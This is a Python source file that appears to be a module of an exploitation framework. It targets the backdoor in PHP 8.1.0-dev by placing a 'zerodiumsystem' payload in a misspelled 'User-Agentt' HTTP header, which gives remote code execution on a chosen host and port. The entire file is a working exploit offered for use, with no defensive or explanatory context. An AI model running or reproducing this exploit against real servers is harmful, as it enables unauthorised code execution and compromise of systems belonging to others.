import requests

from module import Type, RemoteCodeExecutionModule
from utils.web import get_url, random_user_agent


class PHPBackdoor(RemoteCodeExecutionModule):

    def __init__(self):
        super().__init__("php_backdoor",
                         ["php", "backdoor", "rce", "8.1.0-dev"],
                         "php backdoor")

        self.add_option("RHOST", "target host", required=True, type=Type.host)
        self.add_option("RPORT", "target port", required=True, default=80, type=Type.int)
        self.add_option("TIMEOUT", "timeout", required=True, default=5, type=Type.int)

    def exploit(self):
        url = get_url(self.rhost, self.rport)
        headers = {
            "User-Agent": random_user_agent(),
            "User-Agentt": f"zerodiumsystem('{self.get_payload()}');"
        }
        requests.get(url, headers=headers)
